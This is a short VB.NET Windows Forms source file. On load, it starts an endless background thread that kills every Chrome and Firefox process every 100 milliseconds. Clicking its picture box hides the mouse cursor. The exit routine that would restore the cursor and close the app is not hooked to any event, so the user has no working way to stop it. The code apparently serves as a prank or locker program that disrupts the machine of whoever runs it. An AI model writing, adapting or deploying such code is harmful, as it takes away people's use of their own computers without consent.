Public Class Form2
    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Cursor.Show()
        Application.Exit()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Cursor.Hide()
    End Sub

    Private Sub PictureBox1_CursorChanged(sender As Object, e As EventArgs) Handles PictureBox1.CursorChanged
        Cursor.Hide()
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New Threading.Thread(AddressOf Block)
        T.Start()
    End Sub
    Sub Block()
        While True
            For Each P As Process In Process.GetProcessesByName("chrome")
                P.Kill()
            Next
            Threading.Thread.Sleep(100)
            For Each F As Process In Process.GetProcessesByName("firefox")
                F.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
End Class